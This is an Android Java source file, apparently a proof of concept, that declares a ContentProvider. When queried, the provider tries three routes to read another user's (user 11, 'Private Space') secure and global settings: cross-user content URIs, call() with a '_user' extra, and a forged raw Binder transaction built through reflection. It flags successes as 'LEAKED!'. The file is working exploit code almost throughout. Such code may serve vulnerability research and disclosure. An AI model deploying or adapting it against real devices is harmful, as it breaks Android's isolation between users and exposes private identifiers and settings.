package com.poc.crossuser;

import android.content.ContentProvider;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.database.Cursor;
import android.database.MatrixCursor;
import android.net.Uri;
import android.os.IBinder;
import android.os.Parcel;
import android.os.UserHandle;
import java.lang.reflect.Method;

public class CrossUserSettingsProvider extends ContentProvider {

    @Override
    public boolean onCreate() { return true; }

    @Override
    public Cursor query(Uri uri, String[] proj, String sel, String[] selArgs, String sort) {
        MatrixCursor cursor = new MatrixCursor(new String[]{"test", "result"});
        cursor.addRow(new Object[]{"uid", String.valueOf(android.os.Process.myUid())});

        // Method 1: Direct ContentResolver query with cross-user URI
        testDirectSettingsQuery(cursor);

        // Method 2: Use IContentProvider.call() to access cross-user settings
        testSettingsViaCall(cursor);

        // Method 3: Binder transaction to settings service directly
        testSettingsBinderDirect(cursor);

        return cursor;
    }

    private void testDirectSettingsQuery(MatrixCursor cursor) {
        ContentResolver cr = getContext().getContentResolver();

        // Try reading settings for user 11 via content URI with userId
        // content://settings/secure?user=11
        String[] keys = {"android_id", "enabled_notification_listeners", "default_input_method",
                         "bluetooth_name", "lock_screen_owner_info"};

        for (String key : keys) {
            // User 0 (own user) - should work
            try {
                Uri u0 = Uri.parse("content://settings/secure");
                Cursor c = cr.query(u0, new String[]{"value"}, "name=?", new String[]{key}, null);
                if (c != null && c.moveToFirst()) {
                    String val = c.getString(0);
                    cursor.addRow(new Object[]{"settings_u0_" + key, truncate(val)});
                    c.close();
                } else {
                    cursor.addRow(new Object[]{"settings_u0_" + key, "null"});
                    if (c != null) c.close();
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"settings_u0_" + key, "ERR:" + e.getClass().getSimpleName() + ":" + truncate(e.getMessage())});
            }

            // User 11 (Private Space) via cross-user URI
            try {
                // content://11@settings/secure
                Uri u11 = Uri.parse("content://11@settings/secure");
                Cursor c = cr.query(u11, new String[]{"value"}, "name=?", new String[]{key}, null);
                if (c != null && c.moveToFirst()) {
                    String val = c.getString(0);
                    cursor.addRow(new Object[]{"settings_u11_" + key, "LEAKED! " + truncate(val)});
                    c.close();
                } else {
                    cursor.addRow(new Object[]{"settings_u11_" + key, "null/empty"});
                    if (c != null) c.close();
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"settings_u11_" + key, "Ex:" + e.getClass().getSimpleName() + ":" + truncate(e.getMessage())});
            }
        }

        // Also try global settings for user 11
        try {
            Uri u11global = Uri.parse("content://11@settings/global");
            Cursor c = cr.query(u11global, new String[]{"value"}, "name=?", new String[]{"device_name"}, null);
            if (c != null && c.moveToFirst()) {
                String val = c.getString(0);
                cursor.addRow(new Object[]{"global_u11_device_name", "LEAKED! " + val});
                c.close();
            } else {
                cursor.addRow(new Object[]{"global_u11_device_name", "null"});
                if (c != null) c.close();
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"global_u11_device_name", "Ex:" + e.getClass().getSimpleName()});
        }
    }

    private void testSettingsViaCall(MatrixCursor cursor) {
        ContentResolver cr = getContext().getContentResolver();

        // Settings provider also supports call() method
        // call(authority, method, arg, extras)
        // method = "GET_secure", arg = key
        try {
            android.os.Bundle result = cr.call(Uri.parse("content://settings"), "GET_secure", "android_id", null);
            if (result != null) {
                String val = result.getString("value");
                cursor.addRow(new Object[]{"call_secure_android_id", "val=" + val});
            } else {
                cursor.addRow(new Object[]{"call_secure_android_id", "null"});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"call_secure_android_id", "Ex:" + e.getClass().getSimpleName()});
        }

        // Try cross-user call
        try {
            android.os.Bundle extras = new android.os.Bundle();
            extras.putInt("_user", 11);
            android.os.Bundle result = cr.call(Uri.parse("content://settings"), "GET_secure", "android_id", extras);
            if (result != null) {
                String val = result.getString("value");
                cursor.addRow(new Object[]{"call_u11_android_id", val != null ? "LEAKED! " + val : "null"});
            } else {
                cursor.addRow(new Object[]{"call_u11_android_id", "null"});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"call_u11_android_id", "Ex:" + e.getClass().getSimpleName()});
        }
    }

    private void testSettingsBinderDirect(MatrixCursor cursor) {
        // Access the settings provider's IContentProvider binder directly
        // and forge a cross-user call
        try {
            // Get a reference to settings provider via reflection
            ContentResolver cr = getContext().getContentResolver();
            Method acquireMethod = ContentResolver.class.getMethod("acquireProvider", String.class);
            Object icp = acquireMethod.invoke(cr, "settings");
            if (icp == null) {
                cursor.addRow(new Object[]{"binder_settings", "null_provider"});
                return;
            }

            // Get the underlying binder via asBinder()
            Method asBinderMethod = icp.getClass().getMethod("asBinder");
            IBinder binder = (IBinder) asBinderMethod.invoke(icp);
            cursor.addRow(new Object[]{"settings_binder", "acquired desc=" + binder.getInterfaceDescriptor()});

            // The IContentProvider interface:
            // TX=1: query(String callingPkg, String featureId, Uri url, String[] projection,
            //        Bundle queryArgs, ICancellationSignal signal)
            // TX=6: call(String callingPkg, String featureId, String authority, String method,
            //        String arg, Bundle extras)

            // Try direct call for cross-user settings via TX=6 (call)
            String desc = "android.content.IContentProvider";
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                // AttributionSource parcelable (required by IContentProvider)
                data.writeInt(1); // non-null
                data.writeInt(android.os.Process.myUid()); // uid
                data.writeInt(android.os.Process.myPid()); // pid
                data.writeString(getContext().getPackageName()); // packageName
                data.writeString(null); // attributionTag
                data.writeInt(0); // token (null)
                data.writeInt(0); // next (null)

                data.writeString("settings"); // authority
                data.writeString("GET_secure"); // method
                data.writeString("android_id"); // arg

                // Bundle extras with _user=11
                android.os.Bundle extras = new android.os.Bundle();
                extras.putInt("_user", 11);
                data.writeInt(1); // non-null bundle
                extras.writeToParcel(data, 0);

                binder.transact(6, data, reply, 0);
                int ex = reply.readInt();
                if (ex == 0) {
                    int avail = reply.dataAvail();
                    cursor.addRow(new Object[]{"binder_call_u11", "SUCCESS avail=" + avail});
                    if (avail > 4) {
                        // Read Bundle result
                        int nonNull = reply.readInt();
                        if (nonNull != 0) {
                            try {
                                android.os.Bundle result = android.os.Bundle.CREATOR.createFromParcel(reply);
                                String val = result.getString("value");
                                cursor.addRow(new Object[]{"binder_call_u11_val", val != null ? "LEAKED! " + val : "null"});
                            } catch (Exception pe) {
                                cursor.addRow(new Object[]{"binder_call_u11_parse", "parseErr:" + pe.getMessage()});
                            }
                        }
                    }
                } else {
                    String msg = reply.readString();
                    cursor.addRow(new Object[]{"binder_call_u11", "Ex=" + ex + "|" + truncate(msg)});
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"binder_call_u11", "ERR:" + e.getClass().getSimpleName() + ":" + truncate(e.getMessage())});
            }
            data.recycle();
            reply.recycle();

        } catch (Exception e) {
            cursor.addRow(new Object[]{"binder_settings", "ERR:" + e.getClass().getSimpleName() + ":" + truncate(e.getMessage())});
        }
    }

    private String truncate(String s) {
        if (s == null) return "null";
        return s.length() > 120 ? s.substring(0, 120) : s;
    }

    @Override public String getType(Uri uri) { return null; }
    @Override public Uri insert(Uri uri, ContentValues values) { return null; }
    @Override public int delete(Uri uri, String sel, String[] selArgs) { return 0; }
    @Override public int update(Uri uri, ContentValues values, String sel, String[] selArgs) { return 0; }
}
